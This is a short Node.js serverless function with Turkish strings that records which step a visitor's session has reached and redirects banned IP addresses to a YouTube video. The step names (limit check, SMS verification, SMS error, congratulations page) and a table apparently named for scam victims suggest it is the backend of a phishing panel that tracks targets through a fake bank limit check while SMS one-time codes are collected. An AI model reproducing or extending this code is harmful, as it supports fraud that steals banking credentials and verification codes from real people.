const { query } = require('../../lib/db');
const { getClientIp } = require('../../lib/ip');
const { getSessionToken } = require('../../lib/session');

const VALID_STEPS = new Set([
  'Anasayfa',
  'Limit Kontrol',
  'Bekleme Sayfası',
  'SMS Doğrulama',
  'SMS Hatalı',
  'Tebrik Sayfası',
]);

const BANNED_REDIRECT = 'https://www.youtube.com/watch?v=KaInAwef530&ab_channel=AliDemirdal';

exports.handler = async function handler(event) {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: JSON.stringify({ message: 'Yalnızca POST desteklenir.' }) };
  }

  try {
    const sessionToken = getSessionToken(event.headers);
    const ip = getClientIp(event);
    const body = JSON.parse(event.body || '{}');
    const step = body?.step && VALID_STEPS.has(body.step) ? body.step : 'Anasayfa';

    const banCheck = await query('SELECT 1 FROM ban WHERE ban = $1 LIMIT 1', [ip]);
    if (banCheck.rowCount) {
      return {
        statusCode: 200,
        body: JSON.stringify({ banned: true, redirectUrl: BANNED_REDIRECT }),
      };
    }

    if (!sessionToken) {
      return { statusCode: 200, body: JSON.stringify({ active: false }) };
    }

    const result = await query('UPDATE sazan SET now = $1 WHERE session_token = $2 RETURNING id', [step, sessionToken]);
    if (!result.rowCount) {
      return { statusCode: 200, body: JSON.stringify({ active: false }) };
    }

    return { statusCode: 200, body: JSON.stringify({ active: true, step }) };
  } catch (error) {
    console.error('update-session-state hatası:', error);
    return { statusCode: 500, body: JSON.stringify({ active: false }) };
  }
};